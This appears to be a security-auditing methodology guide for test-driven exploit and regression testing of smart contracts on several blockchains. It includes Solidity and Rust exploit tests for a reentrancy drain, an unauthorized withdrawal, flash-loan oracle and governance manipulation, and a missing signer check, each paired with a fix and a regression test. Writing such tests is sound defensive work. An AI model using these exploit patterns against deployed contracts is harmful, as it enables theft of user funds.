---
id: METH-TDD-SECURITY-TESTING
title: Test-Driven Security Testing
category: methodology
severity: high
chains: [ethereum, solana, cosmos, aptos, all]
languages: [solidity, rust, move, typescript]
tags:
  - tdd
  - security-testing
  - exploit-development
  - red-green-refactor
  - foundry
  - proof-of-concept
  - regression-testing
  - fix-verification
last_updated: 2026-02-27
description: >-
  Use when writing security test cases, developing exploit PoCs, or verifying
  fixes — applies the Red-Green-Refactor cycle to security testing where RED
  means the exploit succeeds (vulnerability exists) and GREEN means the fix
  blocks the exploit. Different from general PoC writing — this focuses on
  the TDD cycle, regression prevention, and systematic coverage.
---

# Test-Driven Security Testing

## Overview

Traditional audit PoCs prove a vulnerability exists. Test-driven security
testing goes further: it creates an automated regression test that PREVENTS
the vulnerability from being reintroduced.

**Core principle**: Write the exploit test first. Watch it succeed (RED =
vulnerability exists). Apply the fix. Watch the exploit fail (GREEN = fixed).
The test remains as a permanent regression guard.

### The Security TDD Cycle

```
RED:   Write exploit test → it SUCCEEDS (vulnerability exists)
GREEN: Apply fix → exploit test FAILS/REVERTS (vulnerability patched)
GUARD: Test stays in suite → prevents regression forever
```

This is the OPPOSITE of normal TDD:
- Normal TDD: RED = test fails (feature missing) → GREEN = test passes
- Security TDD: RED = exploit succeeds (vuln exists) → GREEN = exploit fails

## When to Use

**Always use for**:
- Every Critical/High finding (mandatory)
- Fix verification (red-green cycle)
- Regression testing after patches
- Variant analysis (adapt test for similar patterns)

**Especially when**:
- Protocol team asks "can you prove this?"
- Fix needs verification before deployment
- Similar pattern exists elsewhere (systemic testing)
- Vulnerability is timing/ordering dependent

## The Five Phases

### Phase 1: RED — Write Exploit Test

Write a test that demonstrates the vulnerability succeeding.

```solidity
// SECURITY TDD: Phase 1 — RED
// This test MUST PASS (exploit succeeds = vulnerability exists)

function test_VULN_unauthorized_withdrawal() public {
    // === SETUP: Normal protocol state ===
    vm.prank(alice);
    vault.deposit{value: 10 ether}();
    
    uint256 vaultBalanceBefore = address(vault).balance;
    uint256 attackerBalanceBefore = address(attacker).balance;
    
    // === EXPLOIT: Attacker drains Alice's funds ===
    vm.prank(attacker);
    vault.withdraw(10 ether);  // Should revert but doesn't!
    
    // === VERIFY: Funds stolen ===
    assertEq(address(vault).balance, 0, "Vault drained");
    assertEq(
        address(attacker).balance - attackerBalanceBefore,
        10 ether,
        "Attacker received stolen funds"
    );
}
```

**Requirements**:
- Test name starts with `test_VULN_` (distinguishes from functional tests)
- Setup creates realistic protocol state
- Exploit section is clearly commented
- Assertions verify the IMPACT, not just the mechanism

### Phase 2: Verify RED

Run the test. It MUST pass (exploit succeeds):

```bash
forge test --match-test test_VULN_unauthorized_withdrawal -vvv
# Expected: PASS (1 test)
```

**If test FAILS (reverts)**:
- The vulnerability doesn't exist as described
- OR your exploit path is wrong
- Re-analyze root cause (see systematic-root-cause.md)
- Do NOT adjust the test to force it to pass

**If test PASSES**: Vulnerability confirmed. Proceed to Phase 3.

### Phase 3: GREEN — Apply Fix and Verify

Apply the recommended fix, then re-run the exploit test:

```solidity
// FIX: Add access control to withdraw()
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");  // ADDED
    balances[msg.sender] -= amount;
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok, "Transfer failed");
}
```

Run the test again:

```bash
forge test --match-test test_VULN_unauthorized_withdrawal -vvv
# Expected: FAIL (exploit blocked — reverts with "Insufficient balance")
```

**If test still PASSES**: Fix is incomplete. The vulnerability survives.
**If test FAILS with wrong revert**: Fix might work but via wrong mechanism.
**If test FAILS with expected revert**: Fix confirmed. Proceed.

### Phase 4: GUARD — Convert to Regression Test

Rename and restructure the test as a permanent regression guard:

```solidity
// SECURITY REGRESSION: Prevents unauthorized withdrawal
// Original finding: VULN-001 (Critical)
// Root cause: Missing access control on withdraw()
// Fix: Added balance check at withdraw():L12

function test_REGRESSION_001_unauthorized_withdrawal_blocked() public {
    // Setup: Alice deposits
    vm.prank(alice);
    vault.deposit{value: 10 ether}();
    
    // Attack: Bob tries to withdraw Alice's funds
    vm.prank(attacker);
    vm.expectRevert("Insufficient balance");
    vault.withdraw(10 ether);
    
    // Verify: Vault funds unchanged
    assertEq(address(vault).balance, 10 ether);
}
```

**Key changes from exploit test to regression test**:
- Name changes from `test_VULN_` to `test_REGRESSION_NNN_`
- Adds `vm.expectRevert()` — now expects the exploit to FAIL
- Documents the original finding ID and root cause
- Verified the protected state is preserved

### Phase 5: VARIANT — Test Similar Patterns

Search for the same pattern elsewhere and create variant tests:

```solidity
// VARIANT: Same access control issue might exist in other functions
function test_VARIANT_001_unauthorized_emergencyWithdraw() public {
    vm.prank(alice);
    vault.deposit{value: 10 ether}();
    
    vm.prank(attacker);
    vm.expectRevert(); // Should also be blocked
    vault.emergencyWithdraw(10 ether);
}

function test_VARIANT_001_unauthorized_withdrawToken() public {
    // ... same pattern for ERC-20 withdrawal function
}
```

## Patterns by Vulnerability Type

### Reentrancy TDD

```solidity
// Phase 1: RED — Reentrancy exploit succeeds
contract ReentrancyAttacker {
    Vault target;
    uint256 attackCount;
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    receive() external payable {
        if (attackCount < 3) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
}

function test_VULN_reentrancy_drain() public {
    // Setup: Vault has 100 ETH from other users
    deal(address(vault), 100 ether);
    
    // Exploit: Attacker drains with 1 ETH
    ReentrancyAttacker attacker = new ReentrancyAttacker();
    attacker.attack{value: 1 ether}();
    
    // Verify: Attacker stole funds
    assertGt(address(attacker).balance, 1 ether, "Reentrancy drained vault");
}

// Phase 4: GUARD — After fix (nonReentrant added)
function test_REGRESSION_reentrancy_blocked() public {
    deal(address(vault), 100 ether);
    ReentrancyAttacker attacker = new ReentrancyAttacker();
    
    vm.expectRevert(); // nonReentrant blocks re-entry
    attacker.attack{value: 1 ether}();
}
```

### Oracle Manipulation TDD

```solidity
// Phase 1: RED — Price manipulation succeeds
function test_VULN_oracle_manipulation() public {
    // Setup: Normal market conditions
    uint256 normalPrice = oracle.getPrice(WETH);
    
    // Exploit: Flash loan manipulates spot price
    vm.prank(attacker);
    flashLender.flashLoan(1_000_000 ether);
    // In callback: dump tokens to crash price
    pool.swap(1_000_000 ether, 0, attacker, "");
    
    // Verify: Price was manipulated
    uint256 manipulatedPrice = oracle.getPrice(WETH);
    assertLt(manipulatedPrice, normalPrice / 2, "Price manipulated >50%");
}

// Phase 4: GUARD — After fix (TWAP oracle)
function test_REGRESSION_oracle_resists_manipulation() public {
    uint256 normalPrice = oracle.getPrice(WETH);
    
    // Same manipulation attempt
    vm.prank(attacker);
    flashLender.flashLoan(1_000_000 ether);
    pool.swap(1_000_000 ether, 0, attacker, "");
    
    // Verify: TWAP resists single-block manipulation
    uint256 postAttackPrice = oracle.getPrice(WETH);
    assertApproxEqRel(postAttackPrice, normalPrice, 0.05e18, "TWAP resisted");
}
```

### Flash Loan Attack TDD

```solidity
function test_VULN_flash_loan_governance() public {
    // Setup: Attacker has no governance tokens
    assertEq(govToken.balanceOf(attacker), 0);
    
    // Exploit: Flash borrow, vote, return
    vm.startPrank(attacker);
    flashLender.flashLoan(1_000_000e18);
    // In callback: self-delegate, propose, vote
    govToken.delegate(attacker);
    governor.propose(maliciousProposal);
    governor.castVote(proposalId, 1);
    // Return flash loan
    vm.stopPrank();
    
    // Verify: Proposal passed despite attacker owning 0 tokens
    assertTrue(governor.proposalPassed(proposalId));
}
```

## Solana Security TDD

```rust
// Phase 1: RED — Missing signer check
#[test]
fn test_vuln_missing_signer_check() {
    let mut context = setup_program_test().await;
    
    // Exploit: Non-authority calls admin function
    let fake_authority = Keypair::new();
    let ix = Instruction::new_with_borsh(
        program_id,
        &AdminInstruction::UpdateConfig { new_fee: 10000 },
        vec![
            AccountMeta::new(config_pda, false),
            AccountMeta::new_readonly(fake_authority.pubkey(), true), // wrong authority
        ],
    );
    
    // This should fail but doesn't
    let result = context.banks_client
        .process_transaction(Transaction::new_signed_with_payer(
            &[ix], Some(&fake_authority.pubkey()), &[&fake_authority], recent_blockhash
        )).await;
    
    assert!(result.is_ok(), "BUG: Non-authority modified config");
}

// Phase 4: GUARD — After fix
#[test]
fn test_regression_signer_check_enforced() {
    // Same setup but now expect error
    let result = context.banks_client
        .process_transaction(tx).await;
    
    assert!(result.is_err(), "Fix: Unauthorized config update blocked");
}
```

## Test Naming Convention

| Prefix | Phase | Meaning |
|--------|-------|---------|
| `test_VULN_` | RED | Exploit test (expects success) |
| `test_REGRESSION_NNN_` | GUARD | Regression test (expects revert) |
| `test_VARIANT_NNN_` | VARIANT | Same pattern, different location |
| `test_INVARIANT_` | — | Invariant that should always hold |

## Common Rationalizations

| Excuse | Reality |
|--------|---------|
| "PoC is enough, no need for TDD" | PoC proves today. TDD prevents tomorrow. |
| "I'll add the regression test later" | You won't. Do it now. |
| "The fix is obvious, no need for green" | Obvious fixes break other things. Verify. |
| "Too slow to run TDD cycle" | TDD is faster than re-auditing after regression |
| "Test passes immediately" | Then you're testing existing behavior, not the vuln |
| "Code already has tests" | Existing tests didn't catch this. Add security tests. |

## Red Flags — STOP

- Exploit test passes on first try without exploit code → testing wrong thing
- Regression test already passes before fix → not testing the vulnerability
- Can't reproduce the exploit in test → re-analyze root cause
- Fix breaks other tests → fix is too aggressive, needs refinement
- 3+ fix attempts → question the architecture

## Security Review Checklist

- [ ] Every Critical/High finding has a `test_VULN_` test
- [ ] Every `test_VULN_` test was verified RED (exploit succeeds)
- [ ] Every fix was verified GREEN (exploit blocked)
- [ ] Regression tests converted to `test_REGRESSION_NNN_` format
- [ ] Variant tests check for same pattern in other functions
- [ ] Test names document finding ID and root cause
- [ ] Regression suite runs in CI/CD

## Cross-References

- [poc-writing-guide.md](poc-writing-guide.md) — PoC format templates (structure, not cycle)
- [verification-discipline.md](verification-discipline.md) — Evidence requirements
- [systematic-root-cause.md](systematic-root-cause.md) — Root cause analysis before test writing
- [invariant-testing.md](invariant-testing.md) — Complementary stateful fuzzing approach
- [foundry-security.md](../solidity-scanner/resources/foundry-security.md) — Foundry-specific PoC patterns

## Sources

- Superpowers: test-driven-development skill (adapted for security testing)
- Trail of Bits: Building effective security tests
- Foundry: Test-driven security with forge test
